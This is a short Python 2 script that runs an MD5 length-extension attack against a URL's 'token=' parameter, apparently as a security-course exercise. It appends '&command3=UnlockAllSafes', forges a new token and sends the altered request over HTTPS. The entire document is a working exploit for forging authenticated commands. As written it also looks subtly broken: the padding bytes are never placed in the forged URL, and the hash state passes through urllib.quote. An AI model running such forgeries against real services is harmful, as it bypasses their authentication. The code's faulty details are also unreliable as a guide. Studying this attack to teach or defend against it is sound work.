from  pymd5 import md5, padding
import httplib, urlparse, urllib, sys

url = sys.argv[1]

idx1 = url.find("token=")
idx2 = url.find("user=")

url1 = url[:idx1+6]
token = url[idx1+6:idx2]
url2 = url[idx2:len(url)]

x = "&command3=UnlockAllSafes"
url2 = url2 + x

l_of_m = 8 + len(url2)
bits = (l_of_m + len(padding(l_of_m*8)))*8

h = md5(state=urllib.quote(token.strip().decode("hex")), count=bits)

h.update(x)
new_token = h.hexdigest()

new_url = url1 + new_token + url2

parsedUrl = urlparse.urlparse(new_url)
conn = httplib.HTTPSConnection(parsedUrl.hostname,parsedUrl.port)
conn.request("GET", parsedUrl.path + "?" + parsedUrl.query)
print conn.getresponse().read()
